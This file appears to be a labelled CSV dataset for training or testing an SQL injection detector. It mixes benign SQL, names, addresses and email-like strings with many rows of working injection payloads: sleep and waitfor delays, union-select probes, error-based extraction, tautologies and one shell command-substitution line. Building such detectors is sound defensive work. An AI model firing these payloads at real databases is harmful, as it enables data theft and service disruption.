Query,Label
SELECT MIN ( general )  AS add FROM willing,0
"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""%""  =  """,1
manferidor,0
yu-chian,0
SELECT invented,0
SELECT TOP 50 PERCENT * FROM recognize,0
" end and    (    (   ""rqay"" like ""rqay",1
SELECT handle ( s )  FROM occur UNION,0
-1277'   )    )     )   order by 1--,1
"1%""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""%""  =  """,1
7.05E+15,0
" select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",1
"1   )    )    as wmxa where 6485  =  6485 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"-8353'   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'ptlz'  =  'ptlz",1
"1%""  )   union all select null,null,null,null,null#",1
SELECT * FROM above WHERE favorite = 'possibly'  OR floor = 'pony',0
SELECT * FROM final  WHERE salmon NOT LIKE '[ship]%',0
shan-min,0
49211,0
mccreano,0
"1  )   as azdb where 4219  =  4219 union all select null,null,null,null#",1
" SELECT column_name ( s )  FROM seat,labor",0
SELECT * FROM  ( SELECT alive FROM fruit ) ,0
SELECT * FROM eventually 3 SELECT * FROM held,0
"1'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  'yznd' like 'yznd",1
alconchel,0
22268,0
-5861'  )   or 1581  =  2611 and   (  'mvjh' like 'mvjh,1
mieza,0
SELECT * FROM slip WHERE captured = 'locate' FETCH FIRST 3 ROWS ONLY,0
fauno,0
"-1628"" union all select 9189,9189,9189,9189,9189,9189,9189,9189,9189--",1
5.861E+15,0
-8409   )    )    as ipbz where 9984  =  9984 or 3371  =  3869,1
SELECT * FROM onto WHERE equally = 'square'  AND  ( guess = 'snake' OR break = 'bare' ) ,0
SELECT TOP 50 PERCENT * FROM fallen,0
SELECT am ( s )  FROM ago FULL OUTER JOIN,0
cicek0,0
tarragona,0
"INSERT INTO total  ( replied, job, settlers )  VALUES  ( 'fastened', 'scale', 'pond' )  ",0
boyadgian@campanasextractoras.tv,0
1 where 3735  =  3735,1
SELECT * FROM ten FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM draw,0
"calle puruuela, 15 6?d",0
"1' union all select null,null,null--",1
villanueva gualano,0
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",1
"-1606'||  (  select 'qbaa' where 3967  =  3967 union all select 3967,3967,3967,3967,3967--",1
SELECT * FROM plane WHERE band = 'gold' FETCH FIRST 3 ROWS ONLY,0
DELETE FROM forty WHERE till = 'come',0
"waitfor delay '0:0:5' and    (    (   ""%""  =  """,1
7770,0
alcacil,0
SELECT AVG ( party ) FROM apart SELECT SUM ( dish ) ,0
SELECT * FROM  ( SELECT seen FROM see ) ,0
SELECT * FROM becoming WHERE hunter IN  ( SELECT thin FROM guess ) ,0
"1""  )   or sleep  (  5  )   and   (  ""xgtk""  =  ""xgtk",1
select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,1
1   )    )    as pmff where 6649  =  6649,1
SELECT * FROM would FETCH FIRST 50 PERCENT ROWS ONLY,0
"1"" where 3274  =  3274 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
SELECT AVG ( food ) FROM sit SELECT SUM ( wave ) ,0
"1 where 2751  =  2751 union all select null,null,null,null--",1
SELECT * FROM read WHERE breathe = 'thus' FETCH FIRST 3 ROWS ONLY,0
"   SELECT chapter,anything,which,airplane,main     (  (  orbit JOIN ran ON sister.purple =  first.friendly )   INNER JOIN heldON Orders.so =  process.anyID ) ",0
8.7027E+15,0
-3666'  )   where 6386  =  6386 union all select 6386--,1
"1""   )    )    as ynuw where 9138  =  9138",1
SELECT AVG ( labor )  FROM mark  SELECT SUM ( writer ) ,0
" select * from users where id  =  1 or "";.""  =  1 or 1  =  1 -- 1",1
SELECT label ( s )  FROM grown FULL OUTER JOIN,0
"-9140""   )    )    union all select 1623,1623,1623,1623,1623,1623,1623,1623,1623#",1
-5820'   )    )    as lkik where 4044  =  4044 or 7156  =  9197--,1
SELECT camp ( s )  FROM chose UNION,0
"  UPDATE feature SET white =  'or', City =  'cry' WHERE stay =  dream",0
"1%""  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
 (  case when 8422  =  8452 then 1 else null end  ) ,1
"  SELECT * FROM hospital WHERE girl IN  ( 'however', 'most', 'milk' )  ",0
1'  )   as tsge where 6970  =  6970,1
"-3501""   )    )     )   or   (  6789  =  6990  )  *6990 and    (    (     (  ""jnnc"" like ""jnnc",1
"c/ don bosco 65, 10-d",0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",1
1'||  (  select 'miew' where 8360  =  8360 waitfor delay '0:0:5'  )  ||',1
SELECT seldom ( s ) FROM anywhere INNER JOIN,0
inescourt7@citycvs.mil,0
"  SELECT sport AS lie, kind AS [canal]  FROM current",0
"  UPDATE give SET alive =  'post', City =  'hunt' WHERE became =  lose",0
"1'+  (  select 'ixvd' where 4772  =  4772 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",1
oliveira,0
"  SELECT * FROM wood WHERE empty IN  ( 'stay', 'scale', 'beginning' )  ",0
"-4615'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'jipk' like 'jipk",1
SELECT * FROM fallen WHERE oldest LIKE '%broad%',0
SELECT AVG ( widely ) FROM flame SELECT SUM ( nervous ) ,0
"  SELECT coffee AS sun, coast AS [already]  FROM ruler",0
portomarn,0
"   SELECT pond, heading+ ', ' + army+ ' ' + wealth+ ', ' + particles AS star  FROM using",0
DELETE FROM statement,0
SELECT machine,0
"1'   )    )    as bedq where 8781  =  8781 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"  SELECT * FROM uncle WHERE bound IN  ( 'end', 'tea', 'feel' )  ",0
17850,0
-8023' or 6872  =  6872,1
SELECT LCASE ( CustomerName )  AS LowercaseCustomerName FROM Customers;,0
-3339' or 8571  =  8571--,1
SELECT avoid ( s )  FROM room LEFT JOIN,0
"1%'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   '%'  =  '",1
"1 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
SELECT * FROM today WHERE bottle = 'importance' FETCH FIRST 3 ROWS ONLY,0
47209,0
SELECT TOP 3 * FROM forgotten WHERE coast = 'boy' SELECT * FROM gently,0
SELECT * FROM clothes WHERE proud = 'third'  AND  ( knowledge = 'thread' OR recognize = 'rocket' ) ,0
"1""   )    )    as qrrx where 4633  =  4633 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT DISTINCT solar FROM fifth,0
admin'  )   or '1'  =  '1'/*,1
segura,0
"1""  )   as lexx where 2892  =  2892 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
SELECT AVG ( blue ) FROM shall,0
sharnoff,0
"1'  )   as ildf where 5545  =  5545 union all select null,null,null,null#",1
1'  )   as mzby where 6530  =  6530,1
SELECT * FROM chicken ORDER BY beautiful DESC,0
-4325 order by 1--,1
orbita,0
-6755  )   or 9323  =  9323#,1
darbie,0
SELECT man ( s )  FROM lunch SELECT breathe ( s ) ,0
marcos,0
embargad!o,0
SELECT * FROM unit WHERE Price NOT BETWEEN 10 AND 20,0
SELECT TOP 50 PERCENT * FROM same SELECT * FROM love FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM wood,0
"-2289""  )   or 8624  =  6279 and   (  ""ised""  =  ""ised",1
pompa,0
"-2849' union all select 6491,6491,6491,6491,6491,6491,6491--",1
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
karzau@asdn.edu,0
"1%""   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   ""%""  =  """,1
"1'+  (  select 'drvv' where 5622  =  5622 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
fullum6,0
"-8454"" or 6872  =  6872",1
"-5131'   )    )     )   union all select 4854,4854,4854,4854,4854,4854,4854#",1
"  SELECT * FROM nobody WHERE vertical IN  ( 'neighborhood', 'spent', 'opportunity' )  ",0
&1c,1
"1' or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM product WHERE NOT closely = 'lion'  AND NOT far = 'sink',0
a3rovechada,0
SELECT gave ( s )  FROM sum SELECT meant ( s ) ,0
"  UPDATE driven SET become =  'given', City =  'whispered' WHERE silence =  pool",0
SELECT * FROM may WHERE oxygen NOT BETWEEN 'trail' AND 'bring',0
SELECT rose ( s FROM own RIGHT JOIN,0
"1'+  (  select 'rryx' where 1228  =  1228 union all select null,null,null,null,null,null,null,null,null#",1
SELECT * FROM club WHERE with  BETWEEN 10 AND 20,0
"1'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  'mbxh' like 'mbxh",1
"-2782'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
1'||  (  select 'qtep' where 2572  =  2572 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1
"1 or elt  (  6272  =  6272,sleep  (  5   )    )   ",1
SELECT * FROM tribe ORDER BY hunt,0
"SELECT DAYNAME ( ""2017-06-15 09:34:21"" ) ;",0
SELECT * FROM cow WHERE root = 'every' LIMIT 3,0
SELECT * FROM giving WHERE car NOT LIKE '[ran]%',0
SELECT * FROM window WHERE coffee = 'tide',0
SELECT AVG ( official ) FROM body,0
"  SELECT fellow,fact FROM manufacturing WHERE handsome = 'better' UNION SELECT fireplace, result FROM lamp",0
h2lmi0to,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  ""seci""  =  ""seci",1
SELECT * FROM hold 3 SELECT * FROM statement,0
31788831w,0
SELECT * FROM  ( SELECT care FROM yesterday ) ,0
"SELECT * FROM love WHERE pour BETWEEN ""period"" AND    ""full""",0
select sleep  (  5  )   and '%'  =  ',1
SELECT * FROM region WHERE pattern LIKE '%take%',0
SELECT TOP 50 PERCENT * FROM fuel SELECT * FROM owner FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM tin,0
select   (  case when   (  6287  =  8341  )   then 6287 else 1/  (  select 0  )   end  )  --,1
SELECT anywhere ( s )  FROM fighting SELECT string FROM political,0
"-8007' where 9649  =  9649 union all select 9649,9649,9649,9649,9649,9649,9649,9649,9649--",1
SELECT * FROM port WHERE yourself = 'season' LIMIT 3,0
1 where 7464  =  7464 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,1
SELECT * FROM Customers FETCH FIRST 50 PERCENT ROWS ONLY;,0
"-5145' where 2334  =  2334 union all select 2334,2334,2334,2334--",1
SELECT * FROM flight WHERE aid = 'nervous'  AND City = 'solution',0
SELECT LOG2 ( 64 ) ;,0
SELECT * FROM case FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM number,0
1.67E+15,0
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""uglh"" like ""uglh",1
1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',1
SELECT * FROM  ( SELECT life FROM probably ) ,0
23,0
1   )    )    as skex where 7941  =  7941 and sleep  (  5  )  --,1
pawley@santacruzdelvoto.vu,0
1'  )   as dpmh where 5281  =  5281 and 2006  =  2006,1
SELECT * FROM using WHERE corner BETWEEN 'bill' AND 'off',0
28900,0
"1""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""xsfg"" like ""xsfg",1
houstin@maxitienda.zr,0
-1021  )   as erjh where 7845  =  7845 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
SELECT * FROM rush 3 SELECT * FROM anyway,0
ilsup,0
SELECT * FROM most,0
"  SELECT Orders.beautyrID, Employees.yellow, Employees.parts FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.tinID ORDER BY Orders.richID",0
dante@opticaweb.mobi,0
"   SELECT Employees.laugh, COUNT ( Orders.orderID )  AS globeFROM    ( OrdersINNER JOIN generally ON Orders.mayID  =  Employees.meltedID ) ",0
"  SELECT dinnerID AS ID, stranger AS language FROM heavy",0
madisett,0
"-6519'   )    )    as tdlt where 5040  =  5040 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
1'||  (  select 'zeet' from dual where 9567  =  9567 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
1'   )    )    and   (  1427  =  5813  )  *5813 and    (    (   'estb' like 'estb,1
28721,0
928,0
"  SELECT IFNULL ( NULL, ""W3Schools.com"" ) ;",0
0e06u8s17,0
-2733'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'btjx'  =  'btjx,1
"-3782%""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""%""  =  """,1
-2316'   )    )     )   or 8519  =  6010,1
SELECT AVG ( recognize ) FROM quiet,0
SELECT ate ( s )  FROM avoid,0
SELECT * FROM flies ORDER BY voice DESC,0
SELECT pool FROM particles,0
6.36091E+15,0
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'kyxl'  =  'kyxl",1
1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'dgvg'  =  'dgvg,1
SELECT * FROM explore WHERE with = 'affect' LIMIT 3,0
fanning_shepherd@bruoseguridad.name,0
"   SELECT late, properly, furniture FROM travel WHERE fort  IS NULL",0
" select * from users where id  =  '1' union select \.,@@VERSION -- 1'",1
clariana de cardener,0
SELECT TOP 50 PERCENT * FROM cross,0
SELECT * FROM  ( SELECT troops FROM farm ) ,0
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1
SELECT * FROM dark WHERE physical BETWEEN '1996-07-01' AND '1996-07-31',0
mahbeer,0
"1'+  (  select 'pgje' where 4658  =  4658 union all select null,null,null,null,null,null,null,null,null,null#",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (     (  'ojkd'  =  'ojkd",1
"1   )    )    union all select null,null,null,null,null,null#",1
"1""  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  ""lsca"" like ""lsca",1
1 where 3354  =  3354,1
SELECT step FROM neighbor UNION SELECT check FROM trunk ORDER BY printed,0
91436910l,0
" select * from users where id  =  1 or ""  (  1"" or 1  =  1 -- 1",1
nedra,0
"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,1
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1
sugesto,0
1'  )   as jrqh where 6204  =  6204 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
1' where 5458  =  5458 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
"  SELECT topicID AS ID, pipe AS went FROM kitchen",0
1 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  -- saxs,1
-2573   )    )    order by 1#,1
"alcalde lopez rancao, 194, 3-e",0
SELECT * FROM planned WHERE NOT ourselves = 'nervous'  AND NOT open = 'particular',0
SELECT AVG ( imagine ) FROM directly,0
"-4849""   )    )    or   (  5005  =  9111  )  *9111 and    (    (   ""catv"" like ""catv",1
SELECT * FROM support WHERE race = 'needle'  OR important = 'produce',0
DELETE FROM excellent WHERE fastened = 'aware',0
giralda,0
"-1303' union all select 4840,4840#",1
"-6809""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""nfnf""  =  ""nfnf",1
" select * from users where id  =  1 or ""%?"" or 1  =  1 -- 1",1
1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,1
granyena de segarra,0
brewer,0
"  SELECT thinkID AS ID, dry AS him FROM finally",0
"INSERT INTO medicine  ( expression, sides, everything )  VALUES  ( 'wore', 'travel', 'rice' )  ",0
SELECT AVG ( won ) FROM foreign,0
SELECT TOP 50 PERCENT * FROM stop SELECT * FROM thousand FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM alphabet,0
"-4527' union all select 7115,7115#",1
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'sloy'  =  'sloy",1
"calle valle de salazar, 48,",0
$  (  sleep 50  ) ,1
4az,0
SELECT shall FROM better,0
SELECT * FROM wp_houzez_fields_builder order by id ASC,0
"INSERT INTO stronger  ( coming, still, correctly )  VALUES  ( 'jack', 'worse', 'egg' )  ",0
1%'   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
SELECT * FROM arrange WHERE    NOT surprise = 'company',0
SELECT AVG ( feel ) FROM its SELECT SUM ( city ) ,0
"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",1
"   SELECT here, organized+ ', ' + claws+ ' ' + teacher+ ', ' + respect AS count  FROM leaf",0
SELECT love ( s FROM however RIGHT JOIN,0
SELECT * FROM steep 3 SELECT * FROM dangerous,0
kinsman,0
SELECT MIN ( it )  AS pitch FROM dinner,0
SELECT * FROM tell  WHERE place NOT LIKE '[pilot]%',0
"1"" where 9241  =  9241 union all select null#",1
SELECT * FROM exciting FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT colony ( s )  FROM halfway UNION ALL,0
FROM  ( SELECT DISTINCT way FROM area ) ,0
"-8725""   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  ""vblw"" like ""vblw",1
"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1
SELECT year FROM sand,0
"SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 262310,262326,262328 ) ",0
SELECT DISTINCT progress FROM animal,0
1230,0
" SELECT * FROM directly ORDER BY river ASC, return DESC",0
desmedro,0
SELECT AVG ( army ) FROM build SELECT SUM ( running ) ,0
"SELECT * FROM till WHERE garage BETWEEN ""unhappy"" AND    ""double""",0
"1""   )    )     )   and sleep  (  5  )  #",1
select   (  case when   (  5163  =  4861  )   then 1 else 5163*  (  select 5163 from master..sysdatabases  )   end  )  --,1
" select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",1
"-1040 where 3058  =  3058 union all select 3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",1
9639,0
"1'   )    )    as eleh where 1347  =  1347 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT month ( s )  FROM selection,0
if  (  5316  =  4416  )   select 5316 else drop function vtve--,1
"  SELECT Orders.rootrID, Employees.symbol, Employees.fewer FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.contrastID ORDER BY Orders.shallID",0
"1""   )    )    as hfma where 2654  =  2654 and make_set  (  8403  =  8403,8899  )  --",1
"SELECT * FROM change WHERE as BETWEEN ""straw"" AND    ""two""",0
"1' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
SELECT * FROM excitement WHERE meat BETWEEN scientific09/01/1996above AND mix15/31/1996step,0
"  SELECT were,during,said FROM word LEFT JOIN Orders ON science.noneID =  star.rich ORDER BY congress.part",0
"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",1
"-5539""  )   union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",1
"1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  # mafe",1
1  )   as rlft where 1670  =  1670 waitfor delay '0:0:5'--,1
"c/ joaquin guichot, 10",0
SELECT DISTINCT too FROM thirty,0
1 where 8921  =  8921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1
SELECT answer ( s )  FROM primitive UNION,0
SELECT * FROM require WHERE headed = 'gravity'  OR writing = 'game',0
"-3443""   )    )    union all select 4043,4043,4043,4043,4043,4043,4043#",1
vitalia,0
89816761j,0
35is117r,0
1'  )   as lewd where 3118  =  3118 order by 1--,1
p44m8scu6916n,0
294r1152ar,0
coe,0
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'svwr'  =  'svwr,1
SELECT * FROM  ( SELECT station FROM flew ) ,0
"1'  )   as bdei where 9531  =  9531 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM late WHERE board = 'hurry' LIMIT 3,0
grigoriu matons,0
"-6948""   )    )    as ojjl where 1300  =  1300 or 6872  =  6872--",1
goble,0
"  SELECT Orders.againrID, Employees.might, Employees.religious FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fightID ORDER BY Orders.structureID",0
64633352v,0
"1' where 4245  =  4245 union all select null,null--",1
vilamasa pacheca,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 29420 )  ORDER BY meta_id ASC",0
"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # rhli",1
SELECT TOP 3 * FROM pet,0
"-2072""  )   as rjcz where 2491  =  2491 or 6872  =  6872--",1
nooshin,0
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",1
"1   )    )    union all select null,null,null,null,null--",1
vlez acejas,0
salvi figuls,0
SELECT * FROM courage WHERE method = 'tobacco'  AND  ( wonderful = 'tool' OR best = 'laid' ) ,0
5exas9labo,0
"1' or elt  (  6272  =  6272,sleep  (  5   )    )   ",1
1  )   where 1096  =  1096,1
SELECT TOP 3 * FROM package WHERE surface = 'mistake' SELECT * FROM learn,0
SELECT * FROM orbit  WHERE house = dozen,0
"1',  (  select   (  case when   (  5586  =  6403  )   then 1 else 5586*  (  select 5586 from mysql.db  )   end   )    )   ",1
"  SELECT SUBTIME ( ""10:24:21"", ""5"" ) ;",0
-3752%' union all select 9351--,1
SELECT *FROM  ( SELECT column_name ( s )  FROM,0
SELECT COUNT ( favorite )  FROM thirty,0
SELECT * FROM impossible WHERE money = 'by'  OR fly = 'declared',0
"  UPDATE collect SET pocket =  'particular', City =  'rest' WHERE struck =  limited",0
5.27381E+14,0
"  SELECT * FROM cat WHERE member IN  ( 'sum', 'harbor', 'edge' )  ",0
SELECT * FROM  ( SELECT claws FROM moon ) ,0
2742,0
" select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",1
" SELECT * FROM frozen ORDER BY over, former",0
SELECT * FROM salt,0
chuck,0
teo,0
SELECT TOP 50 PERCENT * FROM engineer,0
" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1
SELECT * FROM enjoy WHERE Price NOT BETWEEN 10 AND 20,0
spaeth@directoriogratuito.kr,0
guerra_russinov@weat.fj,0
"gredos, 114 12?g",0
SELECT DISTINCT chicken FROM traffic,0
"1""  )   where 1705  =  1705",1
clav6ria,0
SELECT COUNT ( active ) FROM block,0
"infantes de carrion, 122",0
"  SELECT electric AS perhaps, see AS [like]  FROM hill",0
"c/ honduras, 139 7-a",0
select   (  case when   (  7645  =  5921  )   then 7645 else 7645*  (  select 7645 from information_schema.character_sets  )   end  )  #,1
mayolas,0
SELECT AVG ( temperature ) FROM available SELECT SUM ( stretch ) ,0
"1""   )    )    union all select null,null,null,null--",1
